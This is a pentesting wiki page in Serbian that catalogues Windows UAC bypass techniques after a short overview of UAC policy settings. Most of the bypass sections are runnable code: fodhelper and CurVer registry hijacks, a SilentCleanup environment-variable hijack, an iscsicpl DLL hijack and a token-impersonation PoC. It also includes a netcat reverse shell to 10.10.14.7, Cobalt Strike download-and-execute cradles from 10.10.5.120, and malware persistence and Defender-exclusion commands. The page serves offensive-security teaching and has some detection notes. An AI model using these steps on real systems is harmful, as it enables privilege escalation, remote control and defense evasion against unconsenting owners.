# UAC - User Account Control

{{#include ../../banners/hacktricks-training.md}}

## UAC

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) je funkcija koja omogućava **zahtev za odobrenje povišenih aktivnosti**. Aplikacije imaju različite nivoe `integrity`, a program sa **visokim nivoom** može da izvršava zadatke koji bi **potencijalno mogli da ugroze sistem**. Kada je UAC omogućen, aplikacije i zadaci se uvek **izvršavaju u bezbednosnom kontekstu naloga koji nije administrator** osim ako administrator izričito ne odobri da te aplikacije/zadaci dobiju pristup sistemu na nivou administratora radi izvršavanja. To je praktična funkcija koja štiti administratore od nenamernih izmena, ali se ne smatra bezbednosnom granicom.<sup>[[2]](#references)</sup>

Za više informacija o nivoima integriteta:


{{#ref}}
../windows-local-privilege-escalation/integrity-levels.md
{{#endref}}

Kada je UAC prisutan, korisniku administratoru se dodeljuju 2 tokena: token standardnog korisnika, za obavljanje uobičajenih radnji sa srednjim nivoom integriteta, i token sa administratorskim privilegijama.

Ova [stranica](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) veoma detaljno objašnjava kako UAC funkcioniše i obuhvata proces prijavljivanja, korisničko iskustvo i UAC arhitekturu.<sup>[[2]](#references)</sup> Administratori mogu da koriste bezbednosne politike za konfigurisanje načina rada UAC-a u skladu sa potrebama svoje organizacije na lokalnom nivou (korišćenjem secpol.msc), ili da ga konfigurišu i distribuiraju putem Group Policy Objects (GPO) u Active Directory domenskom okruženju. Različita podešavanja su detaljno objašnjena [ovde](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings). Za UAC se može podesiti 10 Group Policy podešavanja. Sledeća tabela pruža dodatne detalje:

| Group Policy Setting                                                                                                                                                                                                                                                                                                                                                           | Registry Key                | Default Setting                                              |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
| [User Account Control: Admin Approval Mode for the built-in Administrator account](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                                                                           | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\FilterAdministratorToken`   | `0` (Disabled)                                             |
| [User Account Control: Behavior of the elevation prompt for administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` | `5` (Prompt for consent for non-Windows binaries on the secure desktop) |
| [User Account Control: Behavior of the elevation prompt for standard users](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorUser`  | `1` (Prompt for credentials on the secure desktop)         |
| [User Account Control: Detect application installations and prompt for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                                                                 | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableInstallerDetection`   | `1` (Enabled; disabled by default on Enterprise)           |
| [User Account Control: Only elevate executables that are signed and validated](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ValidateAdminCodeSignatures` | `0` (Disabled)                                             |
| [User Account Control: Only elevate UIAccess applications that are installed in secure locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableSecureUIAPaths`       | `1` (Enabled)                                              |
| [User Account Control: Run all administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                                                                            | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA`                  | `1` (Enabled)                                              |
| [User Account Control: Allow UIAccess applications to prompt for elevation without using the secure desktop](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop)                                   | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableUIADesktopToggle`     | `0` (Disabled)                                             |
| [User Account Control: Switch to the secure desktop when prompting for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                                               | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\PromptOnSecureDesktop`      | `1` (Enabled)                                              |
| [User Account Control: Virtualize file and registry write failures to per-user locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableVirtualization`       | `1` (Enabled)                                              |

### Policies for installing software on Windows

**lokalne bezbednosne politike** ("secpol.msc" na većini sistema) podrazumevano su konfigurisane tako da **spreče korisnike koji nisu administratori da instaliraju softver**. To znači da, čak i ako korisnik koji nije administrator može da preuzme instalacioni program za vaš softver, neće moći da ga pokrene bez administratorskog naloga.

### Registry Keys to Force UAC to Ask for Elevation

Kao standardni korisnik bez administratorskih prava, možete da obezbedite da **UAC zatraži akreditive od „standardnog“ naloga** kada pokuša da izvrši određene radnje. Za ovu radnju je potrebno izmeniti određene **registry keys**, za šta su vam potrebne administratorske dozvole, osim ako postoji **UAC bypass** ili je napadač već prijavljen kao administrator.

Čak i ako se korisnik nalazi u grupi **Administrators**, ove izmene prisiljavaju korisnika da **ponovo unese akreditive svog naloga** kako bi izvršio administrativne radnje.

**U praksi je ovo korisno samo ako već imate povišeni token, UAC bypass ili pogrešnu konfiguraciju koja vam omogućava da menjate ove ključeve; u suprotnom, sam upis u registry je blokiran.**

Registry ključevi i unosi koje morate da izmenite su sledeći (podrazumevane vrednosti su navedene u zagradama):

- `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System`:
- `ConsentPromptBehaviorUser` = 1 (3)
- `ConsentPromptBehaviorAdmin` = 1 (5)
- `PromptOnSecureDesktop` = 1 (1)

Ovo se može uraditi i ručno pomoću alata Local Security Policy. Nakon izmene, administrativne operacije od korisnika zahtevaju da ponovo unese svoje akreditive.

### Note

**User Account Control nije bezbednosna granica.** Zbog toga standardni korisnici ne mogu da izađu iz svojih naloga i steknu administratorska prava bez lokalnog privilege escalation exploita.

### Ask for 'full computer access' to a user
```powershell
hostname | Set-Clipboard
Enable-PSRemoting -SkipNetworkProfileCheck -Force

cd C:\Users\hacedorderanas\Desktop
New-PSSession -Name "Case ID: 1527846" -ComputerName hostname
Enter-PSSession -ComputerName hostname
```
### UAC privilegije

- Internet Explorer Protected Mode koristi provere integriteta kako bi sprečio procese sa visokim nivoom integriteta (kao što su web pregledači) da pristupe podacima sa niskim nivoom integriteta (kao što je fascikla sa privremenim Internet datotekama). To se postiže pokretanjem pregledača sa tokenom niskog nivoa integriteta. Kada pregledač pokuša da pristupi podacima uskladištenim u zoni niskog nivoa integriteta, operativni sistem proverava nivo integriteta procesa i u skladu s tim dozvoljava pristup. Ova funkcija pomaže u sprečavanju napada izvršavanja koda na daljinu da dobiju pristup osetljivim podacima na sistemu.
- Kada se korisnik prijavi na Windows, sistem kreira access token koji sadrži listu privilegija korisnika. Privilegije su definisane kao kombinacija prava i mogućnosti korisnika. Token takođe sadrži listu korisnikovih credentials, odnosno credentials koji se koriste za autentifikaciju korisnika na računaru i resursima na mreži.

### Autoadminlogon

Da biste konfigurisali Windows da se automatski prijavi kao određeni korisnik pri pokretanju, podesite **`AutoAdminLogon` registry key**. Ovo je korisno u kiosk okruženjima ili u svrhe testiranja. Koristite ovo samo na bezbednim sistemima, jer se lozinka izlaže u registru.

Podesite sledeće ključeve pomoću Registry Editora ili komande `reg add`:

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`:
- `AutoAdminLogon` = 1
- `DefaultUsername` = username
- `DefaultPassword` = password

Da biste vratili uobičajeno ponašanje pri prijavljivanju, podesite `AutoAdminLogon` na 0.

## UAC bypass

> [!TIP]
> Imajte na umu da je, ako imate grafički pristup žrtvi, UAC bypass jednostavan, jer možete samo kliknuti na „Yes“ kada se pojavi UAC prompt

UAC bypass je potreban u sledećoj situaciji: **UAC je aktiviran, vaš proces radi u kontekstu srednjeg nivoa integriteta, a vaš korisnik pripada administratorskoj grupi**.

Važno je napomenuti da je **mnogo teže zaobići UAC ako je podešen na najviši nivo bezbednosti (Always), nego ako je podešen na bilo koji drugi nivo (Default).**

### Brza trijaža iz shell-a srednjeg nivoa integriteta

Pre nego što pokušate bypass, potvrdite da se nalazite u odgovarajućoj situaciji i mapirajte build hosta na poznate funkcionalne metode:
```powershell
whoami /groups
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v PromptOnSecureDesktop
powershell -c "Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion' | select ProductName,DisplayVersion,CurrentBuild,UBR"
schtasks /Query /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup"
```
Praktične napomene:
- Ako je `EnableLUA=0`, nije vam potreban bypass: bilo koji admin token može direktno da zahteva high integrity.
- `ConsentPromptBehaviorAdmin=2` ili `5` je uobičajen scenario za auto-elevate / COM-based bypasses.
- `Always Notify` podiže nivo zaštite, ali ipak treba testirati tačan build umesto pretpostavljanja da će doći do neuspeha: UACME i dalje prati neke metode kompatibilne sa `AlwaysNotify` na modernim Windows buildovima.<sup>[[3]](#references)</sup>

### UAC disabled

Ako je UAC već onemogućen (`ConsentPromptBehaviorAdmin` je **`0`**), možete **izvršiti reverse shell sa admin privilegijama** (high integrity level) koristeći nešto poput:
```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```
#### Zaobilaženje UAC-a dupliciranjem tokena

- [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
- [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)

### **Veoma** osnovno UAC „zaobilaženje“ (potpun pristup sistemu datoteka)

Ako imate shell sa korisnikom koji se nalazi u grupi Administrators, možete **montirati C$** deljen putem SMB-a (sistem datoteka) lokalno na novom disku i imaćete **pristup svemu unutar sistema datoteka** (čak i administratorskoj početnoj fascikli).

> [!WARNING]
> **Izgleda da ovaj trik više ne funkcioniše**
```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```
### UAC zaobilaženje pomoću Cobalt Strike-a

Cobalt Strike tehnike će funkcionisati samo ako UAC nije podešen na najviši nivo bezbednosti
```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```
**Empire** i **Metasploit** takođe imaju nekoliko modula za **bypass** **UAC-a**.

### Povišeni COM interfejsi (`ICMLuaUtil` / `CMSTPLUA`)

Auto-elevated COM objekti i dalje predstavljaju praktičnu UAC površinu na modernim buildovima. `ICMLuaUtil` se i dalje vodi u UACME-u kao funkcionalan na aktuelnim Windows granama, a offensive alati nastavljaju da prilagođavaju `CMSTPLUA` kombinovanjem procesa na interaktivnom desktopu, 64-bitnog izvršavanja i, ponekad, PEB/process masquerading-a pre pozivanja COM Elevation Moniker-a.<sup>[[3]](#references)</sup>

Praktični saveti:
- Dajte prednost **64-bitnom** procesu u korisničkoj **interaktivnoj sesiji** (najčešće `explorer.exe` ili njegovom child procesu).
- Ako raw shell ne uspe, pokušajte ponovo iz BOF / UACME implementacije umesto naivnog `CreateProcess` wrapper-a.
- Očekujte da se child izvršavanje odvija u **zasebnom elevated procesu**; mnogi BOF-ovi ne eleviraju trenutni beacon in-place.

### KRBUACBypass

Dokumentacija i alat na [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)

### UAC bypass eksploiti

[**UACME** ](https://github.com/hfiref0x/UACME), koji predstavlja **kompilaciju** nekoliko UAC bypass eksploita. Imajte na umu da ćete morati da **kompajlirate UACME koristeći Visual Studio ili msbuild**. Kompilacija će kreirati nekoliko executable fajlova (kao što je `Source\Akagi\outout\x64\Debug\Akagi.exe`), a moraćete da znate **koji vam je potreban.**<sup>[[3]](#references)</sup>\
Trebalo bi da budete **oprezni**, jer će neki bypass-i **promptovati neke druge programe** koji će **upozoriti** **korisnika** da se nešto dešava.<sup>[[3]](#references)</sup>

UACME sadrži **build verziju od koje je svaka tehnika počela da funkcioniše**.<sup>[[3]](#references)</sup> Možete pretražiti tehniku koja utiče na vaše verzije:
```powershell
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```
Takođe, pomoću [ove](https://en.wikipedia.org/wiki/Windows_10_version_history) stranice dobijate Windows izdanje `1607` na osnovu verzija build-a.

Praktičan tok rada je da prvo **procenite build hosta**, a tek onda pokrenete odgovarajući metod:
```cmd
python main.py --scan uac
Akagi64.exe 33 C:\Windows\System32\cmd.exe
```
- `WinPwnage` brzo poredi lokalni build sa svojim poznatim UAC metodama, što je korisno za brzo odbacivanje nefunkcionalnih PoC-ova.<sup>[[4]](#references)</sup>
- `UACME` i dalje predstavlja najbolji javni katalog za povezivanje bypass-a sa preciznim build-om. Nedavna izdanja su dodala nove metode i ponovo testirala postojeće metode na **Windows 11 25H2**, zato ponovo proverite README/beleške o izdanju pre nego što pretpostavite da se stari blog post i dalje primenjuje nepromenjeno.<sup>[[3]](#references)</sup>

### UAC Bypass – fodhelper.exe (Registry hijack)

Pouzdani binar `fodhelper.exe` se na modernom Windows-u automatski pokreće sa povišenim privilegijama. Prilikom pokretanja, on upituje dole navedenu per-user registry putanju bez validacije glagola `DelegateExecute`. Postavljanje komande na to mesto omogućava procesu sa Medium Integrity (korisnik je član grupe Administrators) da pokrene proces sa High Integrity bez UAC prompta.

Registry putanja koju upituje fodhelper:
```text
HKCU\Software\Classes\ms-settings\Shell\Open\command
```
<details>
<summary>PowerShell koraci (postavite svoj payload, zatim ga pokrenite)</summary>
```powershell
# Optional: from a 32-bit shell on 64-bit Windows, spawn a 64-bit PowerShell for stability
C:\\Windows\\sysnative\\WindowsPowerShell\\v1.0\\powershell -nop -w hidden -c "$PSVersionTable.PSEdition"

# 1) Create the vulnerable key and values
New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force | Out-Null

# 2) Set default command to your payload (example: reverse shell or cmd)
# Replace <BASE64_PS> with your base64-encoded PowerShell (or any command)
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -e <BASE64_PS>" -Force

# 3) Trigger auto-elevation
Start-Process -FilePath "C:\\Windows\\System32\\fodhelper.exe"

# 4) (Recommended) Cleanup
Remove-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open" -Recurse -Force
```
</details>
Napomene:
- Radi kada je trenutni korisnik član grupe Administrators, a UAC nivo je podrazumevani/blagi (ne Always Notify sa dodatnim ograničenjima).
- Koristite putanju `sysnative` da pokrenete 64-bitni PowerShell iz 32-bitnog procesa na 64-bitnom Windowsu.
- Payload može biti bilo koja komanda (PowerShell, cmd ili putanja do EXE datoteke). Izbegavajte UI prozore koji zahtevaju interakciju korisnika radi stealth pristupa.

#### CurVer/extension hijack varijanta (samo HKCU)

Noviji uzorci koji zloupotrebljavaju `fodhelper.exe` izbegavaju `DelegateExecute` i umesto toga **preusmeravaju `ms-settings` ProgID** putem vrednosti `CurVer` za konkretnog korisnika. Binarni fajl sa auto-elevacijom i dalje pronalazi handler pod `HKCU`, tako da nije potreban admin token za postavljanje ključeva:<sup>[[5]](#references)</sup>
```powershell
# Point ms-settings to a custom extension (.thm) and map that extension to our payload
New-Item -Path "HKCU:\Software\Classes\.thm\Shell\Open" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\.thm\Shell\Open\command" -Name "(default)" -Value "C:\\ProgramData\\rKXujm.exe" -Force | Out-Null
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings" -Name "CurVer" -Value ".thm" -Force

Start-Process "C:\\Windows\\System32\\fodhelper.exe"   # auto-elevates and runs rKXujm.exe
```
Nakon eskalacije privilegija, malware često **onemogućava buduće upite** postavljanjem vrednosti `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` na `0`, a zatim vrši dodatno izbegavanje zaštite (npr. `Add-MpPreference -ExclusionPath C:\ProgramData`) i ponovo kreira persistence kako bi se izvršavao sa visokim integritetom. Tipičan persistence task čuva **XOR-šifrovanu PowerShell skriptu** na disku i dekodira je i izvršava u memoriji svakog sata:<sup>[[5]](#references)</sup>
```powershell
schtasks /create /sc hourly /tn "OneDrive Startup Task" /rl highest /tr "cmd /c powershell -w hidden $d=[IO.File]::ReadAllBytes('C:\ProgramData\VljE\zVJs.ps1');$k=[Text.Encoding]::UTF8.GetBytes('Q');for($i=0;$i -lt $d.Length;$i++){$d[$i]=$d[$i]-bxor$k[$i%$k.Length]};iex ([Text.Encoding]::UTF8.GetString($d))"
```
Ova varijanta i dalje uklanja dropper i ostavlja samo staged payloads, pa se detekcija oslanja na nadgledanje **`CurVer` hijack-a**, izmene vrednosti `ConsentPromptBehaviorAdmin`, kreiranje Defender exclusion-a ili scheduled tasks koji u memoriji dešifruju PowerShell.<sup>[[5]](#references)</sup>

### UAC bypass putem zadatka `SilentCleanup` (`HKCU\Environment\windir`)

`SilentCleanup` pokreće `cleanmgr.exe` sa najvišim privilegijama i proširuje `%windir%` iz korisničkog okruženja. Ako kontrolišete `HKCU\Environment\windir`, možete preusmeriti to proširivanje na proizvoljnu komandu i dobiti visok nivo integriteta bez dijaloga za potvrdu.<sup>[[8]](#references)</sup> Ovaj metod i dalje vredi testirati na novijim verzijama, jer UACME održava tehniku aktivnom, a nedavno praćenje problema pokazuje da Windows 11 24H2 možda zahteva samo mala prilagođavanja navodnika.<sup>[[3]](#references)</sup>
```cmd
reg add "HKCU\Environment" /v windir /d "cmd.exe /c start powershell.exe" /f
schtasks /Run /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup"
reg delete "HKCU\Environment" /v windir /f
```
Ako task citira putanju u toj build verziji, ponovite pokušaj sa payload-om koji se završava navodnikom (na primer `cmd.exe"`). Uvek očistite `HKCU\Environment\windir` nakon testiranja.

#### Još UAC bypass tehnika

Mnoge klasične UAC bypass tehnike koje zloupotrebljavaju UI tokove, COM objekte ili interakciju sa desktopom zahtevaju **punu interaktivnu sesiju** sa žrtvom; uobičajeni `nc.exe` shell ili servis koji radi u **Session 0** često nisu dovoljni.

To često možete rešiti pomoću **meterpreter** sesije. Migrirajte u **proces** čija je vrednost **Session** jednaka **1**:

![Usmerite ms-settings na prilagođenu ekstenziju (.thm) i mapirajte tu ekstenziju na naš payload - Još UAC bypass tehnika: Ovo možete dobiti pomoću meterpreter sesije. Migrirajte u proces čija je vrednost Session...](<../../images/image (863).png>)

(_explorer.exe_ bi trebalo da radi)

### UAC Bypass pomoću GUI-ja

Ako imate pristup **GUI-ju, možete jednostavno prihvatiti UAC prompt** kada se pojavi; tehnički bypass vam zapravo nije potreban. Zato je dobijanje GUI sesije često dovoljno da se zaobiđe praktična prepreka koju dodaje UAC.

Pored toga, ako dobijete GUI sesiju koju je neko koristio (potencijalno preko RDP-a), **neki alati će raditi kao administrator**, pa odatle možete **pokrenuti**, na primer, **cmd** direktno **kao admin**, bez ponovnog UAC prompta, kao kod alata [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif). Ovo može biti nešto više **stealthy**.

### Bučan brute-force UAC bypass

Ako vam nije važno da budete bučni, uvek možete **pokrenuti nešto poput** alata [**https://github.com/Chainski/ForceAdmin**](https://github.com/Chainski/ForceAdmin), koji **traži elevaciju privilegija sve dok je korisnik ne prihvati**.

### Sopstveni bypass - Osnovna metodologija za UAC bypass

Ako pogledate **UACME**, primetićete da **mnoge UAC bypass tehnike zloupotrebljavaju DLL hijacking** (često tako što nateraju elevated binary da učita DLL kojim upravlja attacker iz writable putanje). [Pročitajte ovo da biste naučili kako da pronađete ranjivost za DLL hijacking](../windows-local-privilege-escalation/dll-hijacking/index.html).

1. Pronađite binary koji će se **autoelevate** (proverite da li se prilikom pokretanja izvršava na nivou viskog integriteta).
2. Pomoću procmon-a pronađite događaje "**NAME NOT FOUND**" koji mogu biti ranjivi na **DLL Hijacking**.
3. Verovatno ćete morati da **upišete** DLL unutar nekih **zaštićenih putanja** (kao što je C:\Windows\System32), u koje nemate dozvole za upis. Ovo možete zaobići pomoću:
1. **wusa.exe**: Windows 7, 8 i 8.1. Omogućava ekstrakciju sadržaja CAB fajla unutar zaštićenih putanja (zato što se ovaj alat izvršava na nivou viskog integriteta).
2. **IFileOperation**: Windows 10.
4. Pripremite **script** za kopiranje vašeg DLL-a unutar zaštićene putanje i pokretanje ranjivog i autoelevated binary-ja.

### Druga UAC bypass tehnika

Sastoji se od praćenja da li **autoElevated binary** pokušava da iz **registry-ja** pročita **ime/putanju** nekog **binary-ja** ili **command-a** koji treba da bude **izvršen** (ovo je interesantnije ako binary traži ove informacije unutar **HKCU**).

### UAC bypass preko `SysWOW64\iscsicpl.exe` + DLL hijack pomoću korisničkog `PATH`-a

32-bitni `C:\Windows\SysWOW64\iscsicpl.exe` je **auto-elevated** binary koji se može zloupotrebiti za učitavanje `iscsiexe.dll` prema redosledu pretrage. Ako možete da postavite maliciozni `iscsiexe.dll` u folder u koji **korisnik može da upisuje**, a zatim izmenite `PATH` trenutnog korisnika (na primer preko `HKCU\Environment\Path`) tako da se taj folder pretražuje, Windows može učitati attacker DLL unutar elevated `iscsicpl.exe` procesa **bez prikazivanja UAC prompta**.<sup>[[1]](#references)[[6]](#references)</sup>

Praktične napomene:
- Ovo je korisno kada je trenutni korisnik u grupi **Administrators**, ali radi na **Medium Integrity** nivou zbog UAC-a.
- Kopija u **SysWOW64** je relevantna za ovaj bypass. Kopiju u **System32** tretirajte kao zaseban binary i nezavisno proverite njeno ponašanje.
- Primitiv je kombinacija **auto-elevation** i **DLL search-order hijacking-a**, pa je isti ProcMon workflow koji se koristi za druge UAC bypass tehnike koristan za proveru učitavanja DLL-a koji nedostaje.

Minimalni tok:
```cmd
copy iscsiexe.dll %TEMP%\iscsiexe.dll
reg add "HKCU\Environment" /v Path /t REG_SZ /d "%TEMP%" /f
C:\Windows\System32\cmd.exe /c C:\Windows\SysWOW64\iscsicpl.exe
```
Ideje za detekciju:
- Postavite alert za `reg add` / upisivanje u registry u `HKCU\Environment\Path`, nakon čega neposredno sledi izvršavanje `C:\Windows\SysWOW64\iscsicpl.exe`.
- Tražite `iscsiexe.dll` na lokacijama koje kontroliše **user**, kao što su `%TEMP%` ili `%LOCALAPPDATA%\Microsoft\WindowsApps`.
- Korelirajte pokretanja `iscsicpl.exe` sa neočekivanim child procesima ili učitavanjima DLL-ova izvan uobičajenih Windows direktorijuma.

### Novija istraživanja koja vredi proveriti zasebno

Neki lanci nakon 2024. više ne izgledaju kao klasični `HKCU\Software\Classes` registry hijack-ovi. Na primer, poisoning activation-context cache-a može povezati **drive remap** i **DLL redirection** kako bi se prešlo sa medium na high integrity putem pouzdanih UI / auto-elevated binarnih fajlova kao što su `ctfmon.exe`, a kasnije i ciljeva kao što je `fodhelper.exe`. Umesto dupliciranja velikog PoC-a ovde, proverite kompaktne primere payload-a u:

{{#ref}}
../windows-local-privilege-escalation/windows-c-payloads.md
{{#endref}}

### Administrator Protection (25H2) drive-letter hijack putem DOS device mapa po logon sesiji

Za kompletnu attack površinu `RAiLaunchAdminProcess` / UIAccess na Windows 11 25H2, pogledajte namensku stranicu:

{{#ref}}
../windows-local-privilege-escalation/uiaccess-admin-protection-bypass.md
{{#endref}}

Windows 11 25H2 „Administrator Protection“ koristi shadow-admin tokene sa mapama `\Sessions\0\DosDevices/<LUID>` po sesiji. Direktorijum se kreira lazy putem `SeGetTokenDeviceMap` pri prvom razrešavanju `\??`. Ako attacker impersonate-uje shadow-admin token samo na nivou **SecurityIdentification**, direktorijum se kreira tako da je attacker **owner** (nasleđuje `CREATOR OWNER`), čime drive-letter linkovi dobijaju prednost nad `\GLOBAL??`.<sup>[[7]](#references)</sup>

**Koraci:**

1. Iz low-privileged sesije pozovite `RAiProcessRunOnce` da biste pokrenuli promptless shadow-admin `runonce.exe`.
2. Duplicirajte njegov primarni token u **identification** token i impersonate-ujte ga dok otvarate `\??`, kako biste primorali kreiranje `\Sessions\0\DosDevices/<LUID>` sa attacker vlasništvom.
3. Kreirajte `C:` symlink koji pokazuje na storage pod kontrolom attackera; naredni pristupi filesystem-u u toj sesiji razrešavaće `C:` ka attacker putanji, čime se omogućava DLL/file hijack bez prompta.

**PowerShell PoC (NtObjectManager):**
```powershell
$pid = Invoke-RAiProcessRunOnce
$p = Get-Process -Id $pid
$t = Get-NtToken -Process $p
$id = New-NtTokenDuplicate -Token $t -ImpersonationLevel Identification
Invoke-NtToken $id -ImpersonationLevel Identification { Get-NtDirectory "\??" | Out-Null }
$auth = Get-NtTokenId -Authentication -Token $id
New-NtSymbolicLink "\Sessions\0\DosDevices/$auth/C:" "\??\\C:\\Users\\attacker\\loot"
```
## Reference

- [1] [LOLBAS: Iscsicpl.exe](https://lolbas-project.github.io/lolbas/Binaries/Iscsicpl/)
- [2] [Microsoft Docs – Kako funkcioniše User Account Control](https://learn.microsoft.com/windows/security/identity-protection/user-account-control/how-user-account-control-works)
- [3] [UACME – Kolekcija UAC bypass tehnika](https://github.com/hfiref0x/UACME)
- [4] [WinPwnage – Skener kompatibilnosti i launcher za UAC bypass](https://github.com/rootm0s/WinPwnage)
- [5] [Checkpoint Research – KONNI koristi AI za generisanje PowerShell Backdoors](https://research.checkpoint.com/2026/konni-targets-developers-with-ai-malware/)
- [6] [Check Point Research – Operacija TrueChaos: 0-Day Exploitation protiv meta vlada jugoistočne Azije](https://research.checkpoint.com/2026/operation-truechaos-0-day-exploitation-against-southeast-asian-government-targets/)
- [7] [Project Zero – Zaobilaženje Windows Administrator Protection](https://projectzero.google/2026/26/windows-administrator-protection.html)
- [8] [Sigma / Detection.FYI – Bypass UAC korišćenjem SilentCleanup Task](https://detection.fyi/sigmahq/sigma/windows/registry/registry_set/registry_set_bypass_uac_using_silentcleanup_task/)

{{#include ../../banners/hacktricks-training.md}}
